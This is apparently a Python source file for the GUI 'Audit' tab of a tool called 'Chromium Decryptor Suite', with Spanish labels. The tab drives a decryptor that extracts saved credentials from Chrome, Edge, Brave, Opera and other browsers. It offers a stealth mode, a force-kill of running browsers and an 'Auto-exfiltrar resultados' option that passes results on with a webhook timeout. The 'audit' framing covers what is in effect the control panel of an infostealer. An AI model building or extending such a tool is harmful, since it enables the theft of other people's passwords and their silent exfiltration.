"""
Tab: Auditoría (Español)
────────────────────────
Controles para lanzar la auditoría de credenciales:
  • Selector de navegador
  • Retraso, carpeta de salida, modo incógnito
  • Botón de ejecución con consola en vivo
  • Panel de estadísticas (encontradas / filtradas / navegadores)
"""

import threading
import tkinter as tk
from pathlib import Path
from datetime import datetime
import customtkinter as ctk

from gui.theme import (
    COLORS, FONTS, PAD,
    make_card, make_label, make_button, make_entry,
    make_section_header, make_badge, make_stat_card,
)

class AuditView(ctk.CTkScrollableFrame):
    """Panel de control de auditoría con explorador de carpetas y timeout de webhooks."""

    BROWSERS = ["Todos", "Chrome", "Edge", "Brave", "Vivaldi", "Opera", "Opera GX"]

    def __init__(self, parent, engine_ref):
        super().__init__(
            parent, 
            fg_color="transparent",
            scrollbar_button_color=COLORS["accent_dim"],
            scrollbar_button_hover_color=COLORS["accent"]
        )
        self._engine = engine_ref           
        self._running = False
        self._results = []
        self._stats = {"total": 0, "filtered": 0, "browsers": 0}
        self._on_results_cb = None          

        self._build_ui()

    def set_results_callback(self, cb):
        self._on_results_cb = cb

    def _build_ui(self):
        # ── Estadísticas ──────────────────────────────────────────────────────
        stats_row = ctk.CTkFrame(self, fg_color="transparent")
        stats_row.pack(fill="x", padx=PAD["lg"], pady=(PAD["lg"], PAD["sm"]))

        self._stat_total   = make_stat_card(stats_row, "Credenciales", "0", "🔑", "accent")
        self._stat_filtered= make_stat_card(stats_row, "Filtradas",    "0", "🔕", "warning")
        self._stat_browser = make_stat_card(stats_row, "Navegadores",  "0", "🌐", "info")
        self._stat_time    = make_stat_card(stats_row, "Duración",     "—", "⏱️", "success")

        for card in (self._stat_total, self._stat_filtered, self._stat_browser, self._stat_time):
            card.pack(side="left", padx=PAD["sm"], expand=True, fill="x")

        # ── Configuración ─────────────────────────────────────────────────────
        make_section_header(self, "Configuración del Escaneo", "⚙️")
        cfg_card = make_card(self)
        cfg_card.pack(fill="x", padx=PAD["lg"], pady=(0, PAD["md"]))

        cfg_inner = ctk.CTkFrame(cfg_card, fg_color="transparent")
        cfg_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])

        # FILA 1: Navegador + Carpeta + Explorer + Timeout
        r1 = ctk.CTkFrame(cfg_inner, fg_color="transparent")
        r1.pack(fill="x", pady=(0, PAD["sm"]))

        L_WIDTH = 90 

        make_label(r1, "Navegador:", style="small", color=COLORS["text_secondary"], width=L_WIDTH, anchor="w").pack(side="left")
        self._browser_var = ctk.StringVar(value="Todos")
        ctk.CTkOptionMenu(
            r1, values=self.BROWSERS, variable=self._browser_var,
            fg_color=COLORS["bg_input"], button_color=COLORS["accent_dim"],
            button_hover_color=COLORS["accent"], dropdown_fg_color=COLORS["bg_card"],
            dropdown_hover_color=COLORS["bg_card_hover"], font=FONTS["body"],
            text_color=COLORS["text_primary"], width=130,
        ).pack(side="left", padx=(0, PAD["md"]))

        make_label(r1, "Destino:", style="small", color=COLORS["text_secondary"]).pack(side="left", padx=(0, PAD["sm"]))
        self._outdir_var = ctk.StringVar(value=".audit")
        
        # Grupo Carpeta + Icono Explorer
        dir_group = ctk.CTkFrame(r1, fg_color="transparent")
        dir_group.pack(side="left", padx=(0, PAD["md"]))
        
        make_entry(dir_group, placeholder=".audit", width=140, textvariable=self._outdir_var).pack(side="left")
        
        def _pick_folder():
            path = tk.filedialog.askdirectory()
            if path: self._outdir_var.set(path)
            
        ctk.CTkButton(
            dir_group, text="📂", width=35, height=28, 
            fg_color=COLORS["accent_dim"], hover_color=COLORS["accent"],
            command=_pick_folder
        ).pack(side="left", padx=PAD["xs"])

        # Autoexfiltración
        self._auto_exfiltrate_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(r1, text="Auto-exfiltrar resultados", variable=self._auto_exfiltrate_var, font=FONTS["body"]).pack(side="left", padx=(PAD["sm"], 0))

        # FILA 2: Opciones de seguridad (Checkboxes)
        r2 = ctk.CTkFrame(cfg_inner, fg_color="transparent")
        r2.pack(fill="x", pady=(0, PAD["sm"]))

        self._stealth_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(r2, text="Modo Invisible", variable=self._stealth_var, font=FONTS["body"]).pack(side="left", padx=(0, PAD["lg"]))

        self._skip_html_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(r2, text="Sin HTML", variable=self._skip_html_var, font=FONTS["body"]).pack(side="left", padx=(0, PAD["lg"]))

        self._skip_csv_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(r2, text="Sin CSV", variable=self._skip_csv_var, font=FONTS["body"]).pack(side="left", padx=(0, PAD["lg"]))

        self._auto_kill_var = ctk.BooleanVar(value=True) 
        ctk.CTkCheckBox(r2, text="Auto-Kill (Fallback)", variable=self._auto_kill_var, font=FONTS["body"]).pack(side="left", padx=(0, PAD["lg"]))

        self._force_kill_var = ctk.BooleanVar(value=False) 
        ctk.CTkCheckBox(r2, text="Forzar Cierre", variable=self._force_kill_var, fg_color=COLORS["danger"], font=FONTS["body"]).pack(side="left")

        # FILA 3: Botones
        r3 = ctk.CTkFrame(cfg_inner, fg_color="transparent")
        r3.pack(fill="x", pady=(PAD["sm"], 0))

        self._run_btn = make_button(r3, "▶  Comenzar Escaneo", command=self._start_audit, style="primary", width=180)
        self._run_btn.pack(side="left", padx=(0, PAD["sm"]))

        self._stop_btn = make_button(r3, "⏹  Detener Proceso", command=self._stop_audit, style="danger", width=140)
        self._stop_btn.pack(side="left", padx=(0, PAD["sm"]))
        self._stop_btn.configure(state="disabled")

        make_button(r3, "↺  Restablecer", command=self._reset_config, style="secondary", width=120).pack(side="left", padx=(PAD["lg"], PAD["sm"]))
        make_button(r3, "🗑  Limpiar Terminal",  command=self._clear_log,   style="danger", width=140).pack(side="left", padx=(0, PAD["sm"]))
        make_button(r3, "📋  Copiar Log",   command=self._copy_log,    style="secondary", width=120).pack(side="left")

        self._status_badge = make_badge(r3, "SISTEMA INACTIVO", "text_muted")
        self._status_badge.pack(side="right", padx=PAD["sm"])

        # ── Consola ───────────────────────────────────────────────────────────
        make_section_header(self, "Terminal de Auditoría en Tiempo Real", "📟")
        log_card = make_card(self)
        log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))

        self._log = ctk.CTkTextbox(
            log_card, fg_color=COLORS["bg_terminal"], text_color=COLORS["text_terminal"],
            font=FONTS["code"], corner_radius=8, border_width=1,
            border_color=COLORS["border"], wrap="word", state="disabled", height=450
        )
        self._log.pack(fill="both", expand=True, padx=PAD["xs"], pady=PAD["xs"])

        self._log._textbox.tag_configure("INFO",    foreground=COLORS["info"])
        self._log._textbox.tag_configure("OK",      foreground=COLORS["success"])
        self._log._textbox.tag_configure("WARN",    foreground=COLORS["warning"])
        self._log._textbox.tag_configure("ERR",     foreground=COLORS["danger"])
        self._log._textbox.tag_configure("SYSTEM",  foreground=COLORS["accent"])
        self._log._textbox.tag_configure("TIMESTAMP", foreground=COLORS["text_muted"])

        self._log_line("SYSTEM", "  Chromium Decryptor Suite — Listo para operar\n")
        self._log_line("TIMESTAMP", "  Ajuste los parámetros y presione 'Comenzar Escaneo'.\n")

    # ── Métodos ───────────────────────────────────────────────────────────────

    def _refresh_stats(self):
        for card, val_str in ((self._stat_total, str(self._stats["total"])), (self._stat_filtered, str(self._stats["filtered"])), (self._stat_browser, str(self._stats["browsers"]))):
            card.winfo_children()[1].configure(text=val_str)

    def _set_duration(self, seconds: float):
        self._stat_time.winfo_children()[1].configure(text=f"{seconds:.1f}s")

    def _log_line(self, tag: str, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self._log.configure(state="normal")
        self._log._textbox.insert("end", f"[{ts}] ", "TIMESTAMP")
        self._log._textbox.insert("end", msg + "\n", tag)
        self._log._textbox.see("end")
        self._log.configure(state="disabled")

    def _clear_log(self):
        self._log.configure(state="normal")
        self._log.delete("0.0", "end")
        self._log.configure(state="disabled")

    def _copy_log(self):
        self._log.configure(state="normal")
        content = self._log.get("0.0", "end")
        self._log.configure(state="disabled")
        self.clipboard_clear()
        self.clipboard_append(content)

    def _reset_config(self):
        self._browser_var.set("Todos")
        self._outdir_var.set(".audit")
        self._auto_exfiltrate_var.set(False)
        self._stealth_var.set(False)
        self._skip_html_var.set(False)
        self._skip_csv_var.set(False)
        self._auto_kill_var.set(True)
        self._force_kill_var.set(False)

    def _start_audit(self):
        if self._running: return
        self._running = True
        
        # Iniciar entorno y logging REAL
        from main import _setup_environment
        _setup_environment(self._outdir_var.get() or ".audit", start_logging=True)

        self._run_btn.configure(state="disabled")
        self._stop_btn.configure(state="normal")
        self._status_badge.configure(text="  PROCESANDO  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"])
        self._clear_log()
        self._log_line("SYSTEM", "Iniciando auditoría profunda de credenciales…")
        threading.Thread(target=self._audit_worker, daemon=True).start()

    def _stop_audit(self):
        self._running = False
        self._log_line("WARN", "Operación cancelada por el usuario.")
        self._finish_audit()

    def _finish_audit(self):
        self._running = False
        self._run_btn.configure(state="normal")
        self._stop_btn.configure(state="disabled")

    def _audit_worker(self):
        import time
        from main import ChromiumDecryptor

        out_dir_str = self._outdir_var.get() or ".audit"
        out_dir = Path(out_dir_str)
        out_dir.mkdir(parents=True, exist_ok=True)
        browser_filter = None if self._browser_var.get() == "Todos" else self._browser_var.get()
        t0 = time.time()

        try:
            decryptor = ChromiumDecryptor()
            if self._force_kill_var.get():
                decryptor.kill_browsers()
                time.sleep(1)

            results, hp, cp = decryptor.audit(
                out_dir, 
                skip_html=self._skip_html_var.get(), 
                skip_csv=self._skip_csv_var.get(),
                browser_filter=browser_filter,
                callback=lambda m, lv: self._after_call(lambda: self._log_line(lv.upper() if lv != "info" else "INFO", m)),
                auto_kill=self._auto_kill_var.get(),
                webhook_timeout=15 # Standard for local audit
            )

            elapsed = time.time() - t0
            if results:
                valid = [r for r in results if r[2].startswith(("http://", "https://"))]
                filtered = [r for r in results if not r[2].startswith(("http://", "https://"))]
                browsers_found = len(set(r[0] for r in results))
                self._stats["total"]    = len(valid)
                self._stats["filtered"] = len(filtered)
                self._stats["browsers"] = browsers_found
            else:
                self._stats["total"] = self._stats["filtered"] = self._stats["browsers"] = 0

            self._after_call(lambda: self._set_duration(elapsed))
            self.after(0, lambda: self._finish_audit_full(results, hp, cp))
        except Exception as e:
            self.after(0, lambda: self._log_line("ERR", f"Error crítico: {e}"))
            self.after(0, self._finish_audit)

    def _finish_audit_full(self, results, hp, cp):
        self._finish_audit()
        if self._on_results_cb:
            self._on_results_cb(results, hp, cp, auto_exfiltrate=self._auto_exfiltrate_var.get())
            badge_color = "success" if self._stats["total"] else "warning"
            badge_txt = f"  {self._stats['total']} DATOS  " if self._stats["total"] else "  VACÍO  "
            self._after_call(lambda: self._status_badge.configure(text=badge_txt, fg_color=COLORS[f"{badge_color}_dim"], text_color=COLORS[badge_color]))

    def _after_call(self, fn):
        self.after(0, fn)
